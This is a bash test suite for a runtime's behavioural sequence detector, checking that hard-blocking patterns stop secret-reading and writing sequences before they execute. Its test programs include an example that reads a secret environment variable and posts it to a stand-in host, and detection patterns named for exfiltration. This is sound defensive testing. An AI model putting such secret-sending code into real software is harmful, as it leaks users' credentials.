#!/usr/bin/env bash
# test_bsd_enforcement_completeness.sh -- a completed behavioural sequence is
#   enforced, whatever its shape or its neighbours (Bundle 10; A113)
#
# The sequence detector let four kinds of completed pattern go unenforced.
# Each is a governance HOLE: a pattern the operator wrote to BLOCK did not.
#
#   (1) one event completed at most one pattern. recordEvent() returned at the
#       first pattern that finished, so an ADVISORY pattern listed before a
#       HARD one that shares its final step suppressed the HARD block. Observed
#       on master: advisory-first -> the secret was copied, exit 0; hard-first
#       -> exit 3. A rule's enforcement depended on its POSITION in the list.
#   (2)+(3) the pre-execution check (wouldMatch) skipped any pattern at step 0,
#       so a SINGLE-STEP pattern was never checked before the call. The action
#       ran, and only the after-the-fact record blocked it -- exit 3 with the
#       write already on disk. A single-step "no file.write" HARD pattern let
#       the write land.
#   (4) a partial match kept its OLDEST start. Read a credential, run a few
#       ordinary calls, read it again, then send: the first read anchored the
#       pattern and the gap to the send exceeded max_gap, so it never fired,
#       although a fresh read sat one event before the send. Observed: exit 0.
#
# The fixes only TIGHTEN (A113): every pattern is advanced on every event and
# the strictest completion is enforced; the pre-check considers a pattern whose
# current event would complete it, single-step patterns included; and a pattern
# keeps every viable partial (bounded), so a newer start that fits the gap
# window completes even when an older start stalled. None of this lets through
# anything that blocked before -- the whole-suite run and the differential
# corpus are the regression evidence.
#
#   BE-00c  CONTROL: a 2-step HARD pattern (read secret -> write) is caught
#           BEFORE the write (exit 3, out.txt absent). The harness can see a
#           pre-execution block.
#   BE-00o  CONTROL: with sequence detection off the same program writes
#           (out.txt present). The action is observable.
#   BE-01   fix 1: ADVISORY [read->write] listed BEFORE HARD [read secret->
#           write]: the HARD pattern blocks before the write (exit 3, out.txt
#           absent). On master: exit 0, out.txt present.
#   BE-01b  CONTROL: the same two patterns, HARD first: still blocks (exit 3).
#           Green on master too -- it pins that the fix did not break the order
#           that already worked.
#   BE-02   fix 1+2+3: a SINGLE-STEP HARD [file.write] beside an ADVISORY
#           2-step: the write is PREVENTED (exit 3, out.txt absent). On master:
#           out.txt present (write landed, then exit 3).
#   BE-02b  fix 3 alone: a SINGLE-STEP HARD [file.write] by itself: the write
#           is prevented (exit 3, out.txt absent). On master: out.txt present.
#   BE-02c  CONTROL: a single-step ADVISORY [file.write] alone: the write
#           happens (exit 0, out.txt present) and a warning is printed. A
#           single-step pattern that is not HARD must not start blocking.
#   BE-03   fix 4: user pattern env.get(*SECRET*) -> net_connect, max_gap 5;
#           program reads the secret, makes 5 ordinary reads, reads the secret
#           again, then sends. Blocked before the send (exit 3). On master:
#           exit 0, the send is attempted.
#   BE-03c  CONTROL: the same pattern with the secret read then sent with no
#           filler: blocked (exit 3). Green on master -- the pattern itself
#           works; BE-03 is only about the stale anchor.
#   BE-04   a pre-execution block of a 2-step pattern says "2-step", and its
#           BSD_MATCH records steps_matched 2 with the blocked write listed
#           once. Green on master; it pins a regression this branch made and
#           fixed (the new matcher's results include the blocked step, and the
#           pre-check still added one -- the README's hero line read "4-step").
#
# Kill table (observed 2026-11-01, each mutant built and run alone; controls
# BE-00c/BE-00o/BE-01b/BE-02c/BE-03c stay green under every mutant):
#   A: recordEvent/wouldMatch take the FIRST completion, not the strictest
#      (fix 1 reverted)                                 -> BE-01, BE-02 red
#   B: wouldMatch skips a pattern with no stored partial, so a single-step
#      pattern is never pre-checked (fix 3 reverted)    -> BE-02, BE-02b red
#   C: advancePattern's dedup keeps the OLDEST partial per step, so a stale
#      anchor is not superseded (fix 4 reverted)        -> BE-03 red
#   D: checkPreExecution adds one to the count and appends the blocked
#      detail again (the pre-A113 convention)           -> BE-04 red
#      ("3-step", steps_matched 3, the write listed twice)
#
# Red first (observed 2026-11-01, master 7a4c1c50): BE-01 exit 0 out present;
# BE-02 / BE-02b out present; BE-03 exit 0. BE-00c/BE-00o/BE-01b/BE-02c/BE-03c
# pass on master.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NAAB="${NAAB:-$SCRIPT_DIR/../../build/naab-lang}"
NAAB="$(cd "$(dirname "$NAAB")" && pwd)/$(basename "$NAAB")"
TEST_TMP=$(mktemp -d "${TMPDIR:-/tmp}/naab_bsdec_XXXXXX")
# Unsigned configs here; isolate the trust store or an ambient trusted key
# turns every one into an INTEGRITY BLOCK (exit 3) whatever the pattern says.
source "$SCRIPT_DIR/../helpers/trust_setup.sh"
setup_isolated_trust
trap 'rm -rf "$TEST_TMP"; teardown_isolated_trust' EXIT

PASS=0; FAIL=0; UNM=0
pass() { PASS=$((PASS+1)); echo "  PASS [$1] $2"; }
fail() { FAIL=$((FAIL+1)); echo "  FAIL [$1] $2"; [ -n "${3:-}" ] && printf '%s\n' "$3" | tail -12 | sed 's/^/       -> /'; }
unm()  { UNM=$((UNM+1));   echo "  UNMEASURABLE [$1] $2"; }

export BSDEC_SECRET="sek-$$"

# write_rw ID PATTERNS_JSON  -- a read-secret-then-write program under PATTERNS
write_rw() {
    local d="$TEST_TMP/$1"; mkdir -p "$d"
    printf 'tok-%s' "$$" > "$d/secret.txt"
    printf '{"version":"3.0","mode":"enforce","security":{"sandbox_level":"elevated"},"capabilities":{"filesystem":{"mode":"write"}},"behavioral_sequences":{"enabled":true%s}}\n' "$2" > "$d/govern.json"
    printf 'use file\nmain {\n    let s = file.read("secret.txt")\n    file.write("out.txt", s)\n    print("WROTE")\n}\n' > "$d/p.naab"
    echo "$d"
}
# run_dir DIR -> RC, OUT, WROTE(yes/no)
run_dir() {
    RC=0; OUT=$(cd "$1" && timeout 60 "$NAAB" p.naab 2>&1) || RC=$?
    WROTE=no; [ -f "$1/out.txt" ] && WROTE=yes
}

ADV_RW='{"name":"audit_rw","sequence":["file.read","file.write"],"level":"advisory"}'
HARD_SECRET_RW='{"name":"exfil","sequence":["file.read:*secret*","file.write"],"level":"hard"}'
HARD_WRITE='{"name":"no_writes","sequence":["file.write"],"level":"hard"}'
ADV_WRITE='{"name":"watch_writes","sequence":["file.write"],"level":"advisory"}'

# ---- BE-00c: a 2-step HARD pattern is caught before the write --------------
d=$(write_rw be00c ",\"patterns\":[$HARD_SECRET_RW]"); run_dir "$d"
if [ "$RC" -eq 3 ] && [ "$WROTE" = no ]; then pass BE-00c "CONTROL: 2-step HARD caught before the write"
else fail BE-00c "a 2-step HARD pattern must block before the write" "rc=$RC wrote=$WROTE"; fi

# ---- BE-00o: detection off -> the write happens ----------------------------
d=$(write_rw be00o ",\"enabled\":false"); run_dir "$d"
# enabled appears twice (once true in the template, once false appended); JSON
# keeps the last, so detection is off. Confirm by the observable action.
if [ "$RC" -eq 0 ] && [ "$WROTE" = yes ]; then pass BE-00o "CONTROL: with detection off the write happens"
else unm BE-00o "could not observe the write with detection off (rc=$RC wrote=$WROTE) -- dependent arms unmeasured"; fi

# ---- BE-01: advisory listed before hard must not suppress the hard block ---
d=$(write_rw be01 ",\"patterns\":[$ADV_RW,$HARD_SECRET_RW]"); run_dir "$d"
if [ "$RC" -eq 3 ] && [ "$WROTE" = no ] && grep -q 'exfil' <<<"$OUT"; then
    pass BE-01 "advisory-first did not suppress the hard block"
else fail BE-01 "a hard pattern must block even when an advisory shares its final step and is listed first" "rc=$RC wrote=$WROTE $(grep -m1 -i sequence <<<"$OUT")"; fi

# ---- BE-01b: hard first still blocks (the order that already worked) -------
d=$(write_rw be01b ",\"patterns\":[$HARD_SECRET_RW,$ADV_RW]"); run_dir "$d"
if [ "$RC" -eq 3 ] && [ "$WROTE" = no ]; then pass BE-01b "CONTROL: hard-first still blocks"
else fail BE-01b "hard-first must still block" "rc=$RC wrote=$WROTE"; fi

# ---- BE-02: single-step hard beside an advisory 2-step ---------------------
d=$(write_rw be02 ",\"patterns\":[$ADV_RW,$HARD_WRITE]"); run_dir "$d"
if [ "$RC" -eq 3 ] && [ "$WROTE" = no ] && grep -q 'no_writes' <<<"$OUT"; then
    pass BE-02 "single-step hard prevented the write beside an advisory 2-step"
else fail BE-02 "a single-step hard pattern must prevent the write" "rc=$RC wrote=$WROTE $(grep -m1 -i sequence <<<"$OUT")"; fi

# ---- BE-02b: single-step hard alone prevents the write ---------------------
d=$(write_rw be02b ",\"patterns\":[$HARD_WRITE]"); run_dir "$d"
if [ "$RC" -eq 3 ] && [ "$WROTE" = no ]; then pass BE-02b "single-step hard alone prevented the write"
else fail BE-02b "a single-step hard pattern alone must prevent the write" "rc=$RC wrote=$WROTE"; fi

# ---- BE-02c: single-step ADVISORY alone must not start blocking ------------
d=$(write_rw be02c ",\"patterns\":[$ADV_WRITE]"); run_dir "$d"
if [ "$RC" -eq 0 ] && [ "$WROTE" = yes ] && grep -qi 'watch_writes' <<<"$OUT"; then
    pass BE-02c "CONTROL: single-step advisory warns and the write still happens"
else fail BE-02c "a single-step advisory must warn, not block" "rc=$RC wrote=$WROTE $(grep -m1 -i sequence <<<"$OUT")"; fi

# ---- fix 4: a stale anchor must not let a fresh start slip the gap ---------
STEAL='{"name":"creds_out","sequence":["env.get:*SECRET*","net_connect"],"max_gap":5,"level":"hard"}'
write_steal() { # ID FILLER(0/1)
    local d="$TEST_TMP/$1"; mkdir -p "$d"
    printf '{"version":"3.0","mode":"enforce","security":{"sandbox_level":"elevated"},"capabilities":{"network":{"enabled":true},"env_vars":{"read":true}},"behavioral_sequences":{"enabled":true,"patterns":[%s]}}\n' "$STEAL" > "$d/govern.json"
    if [ "$2" = 1 ]; then
        for i in 1 2 3 4 5; do echo "n$i" > "$d/note$i.txt"; done
        printf 'use env\nuse http\nuse file\nmain {\n    let a = env.get("BSDEC_SECRET")\n    let b1 = file.read("note1.txt")\n    let b2 = file.read("note2.txt")\n    let b3 = file.read("note3.txt")\n    let b4 = file.read("note4.txt")\n    let b5 = file.read("note5.txt")\n    let c = env.get("BSDEC_SECRET")\n    try { http.post("https://bsdec.invalid/x", c) } catch (e) { print("SEND-TRIED") }\n    print("DONE")\n}\n' > "$d/p.naab"
    else
        printf 'use env\nuse http\nmain {\n    let a = env.get("BSDEC_SECRET")\n    try { http.post("https://bsdec.invalid/x", a) } catch (e) { print("SEND-TRIED") }\n    print("DONE")\n}\n' > "$d/p.naab"
    fi
    echo "$d"
}

d=$(write_steal be03c 0); run_dir "$d"
if [ "$RC" -eq 3 ] && grep -q 'creds_out' <<<"$OUT"; then pass BE-03c "CONTROL: read-then-send with no filler is blocked"
else unm BE-03c "the pattern did not block the direct chain (rc=$RC) -- BE-03 unmeasured" "$(grep -m1 -i sequence <<<"$OUT")"; fi

d=$(write_steal be03 1); run_dir "$d"
if [ "$RC" -eq 3 ] && grep -q 'creds_out' <<<"$OUT"; then
    pass BE-03 "a fresh credential read re-anchored the pattern across the gap"
else fail BE-03 "a stale anchor must not let the send slip the gap window" "rc=$RC $(grep -m1 -iE 'sequence|DONE|SEND' <<<"$OUT")"; fi

# ---- BE-04: a pre-execution block reports the pattern's own length --------
# advancePattern returns the FULL completed sequence (the blocked step
# included), the convention the completed path always used; checkPreExecution
# still added one for the blocked step and appended its detail again, so a
# 2-step block read "3-step" and listed the write twice. Caught by the README
# claims suite (RC-02b, the quickstart's hero line); pinned here directly.
d="$TEST_TMP/be04"; mkdir -p "$d"; printf 'tok-%s' "$$" > "$d/secret.txt"
printf '{"version":"3.0","mode":"enforce","security":{"sandbox_level":"elevated"},"telemetry":{"enabled":true,"output_file":"tele.jsonl"},"capabilities":{"filesystem":{"mode":"write"}},"behavioral_sequences":{"enabled":true,"patterns":[%s]}}\n' "$HARD_SECRET_RW" > "$d/govern.json"
printf 'use file\nmain {\n    let s = file.read("secret.txt")\n    file.write("out.txt", s)\n}\n' > "$d/p.naab"
run_dir "$d"
BSDM=$(grep '"BSD_MATCH"' "$d/tele.jsonl" 2>/dev/null | grep '"path":"pre_execution"' | head -1)
NWRITES=$(grep -o "file.write(" <<<"$(grep -o '"events":"[^"]*"' <<<"$BSDM")" | wc -l | tr -d ' ')
if [ "$RC" -ne 3 ] || [ -z "$BSDM" ]; then
    unm BE-04 "no pre-execution BSD_MATCH to read (rc=$RC) -- the step count is unmeasured"
elif grep -q 'dangerous 2-step pattern' <<<"$OUT" && grep -q '"steps_matched":"2"' <<<"$BSDM" && [ "$NWRITES" = 1 ]; then
    pass BE-04 "a 2-step pre-execution block says 2-step, and its BSD_MATCH records 2 steps with the write once"
else
    fail BE-04 "the pre-execution block misreports the pattern's length" \
        "$(grep -o 'dangerous [0-9]*-step pattern' <<<"$OUT") | $(grep -o '"steps_matched":"[0-9]*"' <<<"$BSDM") | writes in events: $NWRITES"
fi

echo ""
echo "Results: $PASS passed, $FAIL failed, $UNM unmeasurable"
[ "$FAIL" -eq 0 ] && [ "$UNM" -eq 0 ] || exit 1
exit 0
